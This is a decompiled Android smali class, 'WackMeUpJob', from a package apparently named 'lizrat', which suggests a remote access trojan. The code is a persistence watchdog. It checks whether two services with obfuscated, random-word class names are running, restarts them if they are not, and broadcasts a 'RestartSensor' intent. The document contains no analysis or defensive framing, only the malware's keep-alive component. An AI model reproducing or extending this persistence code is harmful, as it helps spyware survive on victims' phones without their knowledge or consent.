.class public LLiz0rd/lizrat/WackMeUpJob;
.super Landroid/app/job/JobService;
.source "WackMeUpJob.java"


# instance fields
.field private JobId:I


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 16
    invoke-direct {p0}, Landroid/app/job/JobService;-><init>()V

    const/16 v0, 0x64

    .line 19
    iput v0, p0, LLiz0rd/lizrat/WackMeUpJob;->JobId:I

    return-void
.end method

.method private isServiceWork(Landroid/content/Context;Ljava/lang/String;)Z
    .locals 2

    const-string v0, "activity"

    .line 64
    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/app/ActivityManager;

    const/16 v0, 0x64

    .line 65
    invoke-virtual {p1, v0}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    move-result-object p1

    const/4 v0, 0x0

    if-nez p1, :cond_0

    return v0

    .line 69
    :cond_0
    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :cond_1
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager$RunningServiceInfo;

    .line 70
    iget-object v1, v1, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    invoke-virtual {v1}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v1

    .line 71
    invoke-virtual {v1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    const/4 p1, 0x1

    return p1

    :cond_2
    return v0
.end method


# virtual methods
.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    .line 22
    new-instance p1, Landroid/content/Intent;

    invoke-virtual {p0}, LLiz0rd/lizrat/WackMeUpJob;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    const-class p3, LLiz0rd/lizrat/SensorRestarterBroadcastReceiver;

    invoke-direct {p1, p2, p3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string p2, "RestartSensor"

    invoke-virtual {p1, p2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p0, p1}, LLiz0rd/lizrat/WackMeUpJob;->sendBroadcast(Landroid/content/Intent;)V

    const/4 p1, 0x1

    return p1
.end method

.method public onStartJob(Landroid/app/job/JobParameters;)Z
    .locals 1

    .line 33
    :try_start_0
    const-class p1, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;

    invoke-virtual {p1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object p1

    invoke-direct {p0, p0, p1}, LLiz0rd/lizrat/WackMeUpJob;->isServiceWork(Landroid/content/Context;Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_0

    .line 35
    new-instance p1, Landroid/content/Intent;

    const-class v0, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, p1}, LLiz0rd/lizrat/WackMeUpJob;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 37
    :cond_0
    const-class p1, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;

    invoke-virtual {p1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object p1

    invoke-direct {p0, p0, p1}, LLiz0rd/lizrat/WackMeUpJob;->isServiceWork(Landroid/content/Context;Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_1

    .line 39
    new-instance p1, Landroid/content/Intent;

    const-class v0, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, p1}, LLiz0rd/lizrat/WackMeUpJob;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    const/4 p1, 0x0

    return p1
.end method

.method public onStopJob(Landroid/app/job/JobParameters;)Z
    .locals 0

    const/4 p1, 0x0

    return p1
.end method
